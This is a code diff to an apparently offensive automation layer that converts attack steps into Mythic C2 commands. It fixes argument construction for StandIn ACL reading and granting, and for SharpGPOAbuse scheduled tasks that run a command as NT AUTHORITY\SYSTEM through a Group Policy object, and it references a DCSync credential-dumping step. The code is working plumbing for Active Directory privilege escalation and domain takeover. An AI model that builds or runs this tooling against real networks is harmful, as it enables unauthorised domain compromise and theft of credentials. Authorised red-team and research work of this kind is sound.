@@ -336,7 +336,10 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
             step,
             config,
             _text(parameters.get("tool")),
-            " ".join(["--object", _quote_cli(parameters.get("target_dn")), "--ntacl"]),
+            _standin_acl_read_args(
+                _text(parameters.get("target_dn")),
+                _text(parameters.get("principal")),
+            ),
         )
     if operation == "drsuapi-dcsync":
         return _drsuapi_dcsync_command(step, config)
@@ -3792,9 +3795,17 @@ def _sharp_gpo_task_args(parameters: dict[str, Any]) -> str:
         "--TaskName", _quote_cli(parameters.get("task_name")),
         "--Author", _quote_cli(parameters.get("author") or "NT AUTHORITY\\SYSTEM"),
         "--Command", _quote_cli(parameters.get("command")),
-        "--Arguments", _quote_cli(parameters.get("arguments")),
-        "--GPOName", _quote_cli(parameters.get("gpo")),
     ]
+    arguments = _text(parameters.get("arguments"))
+    if arguments.lstrip().startswith("-"):
+        # CommandLineParser 1.x treats a following `--foo` token as a new outer option,
+        # even when Apollo preserved it as one quoted argv value. Bind option-like inner
+        # command lines with the long-option `=` form so SharpGPOAbuse receives them as
+        # the `--Arguments` value instead of rejecting StandIn-style flags.
+        pieces.append(_quote_cli("--Arguments=" + arguments))
+    else:
+        pieces.extend(["--Arguments", _quote_cli(arguments)])
+    pieces.extend(["--GPOName", _quote_cli(parameters.get("gpo"))])
     if parameters.get("force", True) is not False:
         pieces.append("--Force")
     return " ".join(pieces)
@@ -4016,10 +4027,29 @@ def _ps_encoded_command(script: str) -> str:
 
 def _standin_grant_args(target_dn: str, principal: str, guid: str) -> str:
     return " ".join([
-        "--object", _quote_cli(target_dn),
+        "--object", _quote_cli(_standin_object_filter(target_dn)),
         "--grant", _quote_cli(principal),
         "--guid", _quote_cli(guid),
     ])
+
+
+def _standin_acl_read_args(target_dn: str, principal: str = "") -> str:
+    pieces = [
+        "--object", _quote_cli(_standin_object_filter(target_dn)),
+        "--access",
+    ]
+    if principal:
+        pieces.extend(["--ntaccount", _quote_cli(principal)])
+    return " ".join(pieces)
+
+
+def _standin_object_filter(target_dn: str) -> str:
+    text = _text(target_dn).strip()
+    if text.casefold().startswith("distinguishedname="):
+        return text
+    if text.casefold().startswith("dc="):
+        return "distinguishedname=" + text
+    return text
 
 
 def _adapter_text(config: dict[str, Any], key: str, default: str) -> str:
